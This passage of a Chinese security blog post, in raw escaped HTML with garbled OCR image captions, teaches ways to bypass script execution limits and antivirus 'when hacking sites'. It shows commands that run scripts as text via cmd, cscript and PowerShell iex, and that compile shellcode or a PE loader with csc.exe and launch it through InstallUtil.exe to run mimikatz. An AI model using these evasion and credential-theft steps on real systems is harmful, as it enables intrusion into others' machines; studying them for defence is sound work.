lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 14pt;"><strong></strong></span></span></p><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 14pt;"><strong>0x01 </strong></span></span><span style="font-size:10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 14pt;"><strong>脚本执行</strong></span><span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><p><span style="font-size:10.5pt">当在一些情况下，比如限制了</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">.</span><span lang="EN-US" style="font-size:10.5pt">bat|.vbs|.ps1</span><span style="font-size:10.5pt">脚本执行，我们可以通过以下方法绕过<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;bat &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cmd&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;k &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; script&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;txt&amp;nbsp;&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;vbs&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cscript&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;//E:vbscript script.txt&amp;nbsp; &lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;ps1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Get&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; script&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;txt &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; iex&lt;/span&gt;</code></pre></div><p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image002e7de5b8c-a415-4684-b70c-b4e3331da3fe.jpg" alt="说明: 计算机生成了可选文字: 扮…｛一”￡e护忿ne卜。。～_刀esktop勺，ore&gt;echonetuse护＞abc。txt口刃esktop劝lore&gt;t夕peabc。txt劝sers、劝】sers">&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image004699c5601-2d34-4798-a2c2-dd9e98b15627.jpg" alt="说明: 计算机生成了可选文字: 劝】sers、刀esktop勺110护e&gt;echoHsgbox&quot;abc&quot;&gt;abcd。txt山se护s\gbox&quot;abc&quot;乃esktop为110护e&gt;t夕peabcd。txt劝】sers、刀esktop勺Ilore&gt;cscriPt.eXe//F:vbscriPtabcd。txtic护osoft&lt;R&gt;Uindo&quot;s权所有＜c)HicrosoFtSc护iptHostCorpo护ationUe护Sions。81996一2日日10保留所有权利。">&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image006edace60a-5f79-4648-bc14-cee12d830638.jpg" alt="说明: 计算机生成了可选文字: ：劝sers＼刀esktop场ore&gt;po&quot;e护shellindo讨5Po&quot;erghell权所有＜c)2朋，Hic护osoftCorporation。保留所有权利。SC：劝」sers">&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span style="font-size:10.5pt">测试的时候请注意编码这个坑，如果你自己新建一个文件手动写</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">“net<br>user”</span><span style="font-size:10.5pt">到文件测试，你会发现不成功，所以请用</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">echo</span><span style="font-size:10.5pt">。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image008dc7cbd69-3680-491a-b250-7fb6a0754aae.jpg" alt="说明: 计算机生成了可选文字: {勺」忍e犷公＼叨se犷公‘山，eP。＼Desktop城。护e&gt;cod。exe/k&lt;1。txt刀e">&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US"><br></span></p><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;"><strong>0x01 </strong></span></span><span style="font-size:10.5pt"><strong><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">利用</span><span lang="EN-US"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">InstallUtil.exe</span></span><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">执行程序</span></strong><span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><p><span style="font-size:10.5pt">有些时候搞站遇到不能执行</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">exe</span><span style="font-size:10.5pt">，或者是杀毒软件太厉害，这个方法很好的绕过了检测。当然环境种必须是</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">.</span><span lang="EN-US" style="font-size:10.5pt">net4.0</span><span style="font-size:10.5pt">以上。</span></p><p><span style="font-size:10.5pt"><br></span></p><p><strong><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">1.</span></span><span style="font-size:10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">直接用</span></span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">msf</span></span><span style="font-size:10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">生成</span></span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">shellcode</span></span><span style="font-size:10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">，执行</span></span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">shellcode</span></span></strong><span lang="EN-US" style="font-size:10.5pt">&lt;o:p&gt;&lt;/o:p&gt;</span></p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;Step&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;One&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\csc&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unsafe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;platform&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;x64 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exeshell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Shellcode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cs&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;Step&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Two&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\InstallUtil&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;logfile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;LogToConsole&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;U exeshell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe&lt;/span&gt;</code></pre></div><p><span style="font-size:10.5pt">当然了，如果你想第一步自己本地搞定，然后第二部再上传服务器执行也行。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image010ed679b88-d651-4529-b810-5165ff9a767a.jpg" alt="说明: 计算机生成了可选文字: c：叨二e，二＼Pentest叨esktop场。，e&gt;c，咐indo。，训ic&quot;0,oft·HFI咄斌c。exe/unsafe/platforn:x64/out:exeshell。exeShellcode。cHic护osoft&lt;R&gt;Uisua1C林2日1日Conpilerue犷公ion4。日。3日31，。1Cop夕护ight&lt;C&gt;HicrosoftCorporation.nllrightsrese护ued。口巴王月口巨曰口困查看少）编辑汪）帮助0f)0C：劝se护s凡Pentest凡Desktop勺110护e&gt;C：劝Jindo&quot;s、洲ic护osoft。HFTStdllUtil。eXeHIC护OS0ft&lt;R&gt;Cop夕护ight&lt;c&gt;/logfile=/LogToConsole=false/Uexeshell。e已。HETF护ane衬orkIn忿tallationutilit夕Ue护sionHicrosoftCo护poration。自11护ights护ese护ued。邑盆山丝丝全呢尸t熙土业丝丛卫冗翅业业一｝州州州习习到到到到川到川到川习到到到习到canbeUn布nstall/Install.Install浦5transact浦onal,andr.」evo嘴dUn有nstall(System.Collect瑞ons.ID布ct嘴onarysavedstate:到到到曰｝曰习日,EXec();">&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US"><br></span></p><p><strong><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">2.</span></span><span style="font-size:10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">直接执行</span></span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">pe</span></span><span style="font-size:10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">文件（执行</span></span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">mimikatz</span></span></strong><span style="font-size:10.5pt"><strong><span data-wiz-span="data-wiz-span" style="font-size: 12pt;">）</span></strong><span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><p><span style="font-size:10.5pt">如果是</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">pe</span><span style="font-size:10.5pt">文件，需要先把</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">pe</span><span style="font-size:10.5pt">文件</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">base64</span><span style="font-size:10.5pt">编码，有两种方法：<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Base64&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Encode&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Mimikatz&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;In&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;$fileName &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;mimikatz.exe&quot;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;$fileContent &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; get&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;content $fileName&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;$fileContentBytes &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Text&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;UTF8&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;GetBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$fileContent&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;$fileContentEncoded &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$fileContentBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;$fileContentEncoded &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;content &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$fileName &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;.b64&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBytes&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(@&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;C:\Tools\Mimikatz.exe&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;typ&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBase64String&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ToBase64String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBytes&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;typ&quot;&gt;StreamWriter&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sw &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;StreamWriter&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(@&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;C:\Tools\Mimikatz.b64&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;</code><br>11.  <code>&lt;span class=&quot;pln&quot;&gt;sw&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;AsBase64String&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;);&lt;/span&gt;</code><br>12.  <code>&lt;span class=&quot;pln&quot;&gt;sw&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;();&lt;/span&gt;</code></pre></div><p><span style="font-size:10.5pt">利用同上：<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\csc&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;unsafe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PELoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PELoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cs&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework64\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\InstallUtil&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;logfile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;LogToConsole&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;U &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PELoader&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe&lt;/span&gt;</code></pre></div><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image0122b446ae6-a163-41b0-83f8-90766d01d629.jpg" alt="说明: 计算机生成了可选文字: C:\Users\pentest\Desktop\more&gt;C:＼讨indo树s\Hicrosoft.NET\Frame讨ork64\v左．0.30319\cc.exe/unsafeO1ut:PELoader.exePELoader.cssu日IC#2010Compilerversion左．0.30319.1icrosoftCorpor日tion．日11rightsreserved.../U,U曰飞．.1..Qn八L叮．.1叮．tHicrosoftCop岁rightC:\Users\pentest\Desktop\more&gt;C:＼讨indo讨s\Hicrosoft.NET\Fr日me讨ork6左＼v左．0.30319\Ist日1IUtil.exe/101．刀1卫．心Q曰C叮‘.t叮盯．.H1crosoftCop夕right.NEgfile=/LogToConsole=folse/UPELooder.exeTFraoe树orkInstallationutilitvVersion左．0.30319.1MicrosoftCorporation．日11rightsreserued二PreferredLood日ddress=140000000日1locatedSpaceFor63000atIBC60000Section.text,CopiedToIBC61000Section.rd日ta,CopiedToIBC8E000Section.d日t日，CopiedToIBCB7000Section.pdata,CopiedToIBCBB000Section.rsrc,CopiedToIBCBD000Section.reloc,CopiedToIBCC1000Delt日＝FFFFFFFEDBC60000Loaded日DVRPI32.dllLoddedCRVPT32.dllLo日dedcrvptdll.dllLo日dedNET日PI32.dllLoadedNTOS日Pl.dllLoadedRPCRT4.dllLo日dedSHL讨RPI.dllLo日deds日HLIB.dllLoadedSecur32.dllLoadedSHELL32.dllLo日dedUSER32.dllLo日dedntdll.dllLoadedKERNEL32.dllLo日dedmsvcrt.dllExecutingHimikatz.#####.mimikatz2.oalpha(x64)release">&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US"><br></span></p><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><strong><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">0x02 </span></span><span style="font-size:10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">利用</span></span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span 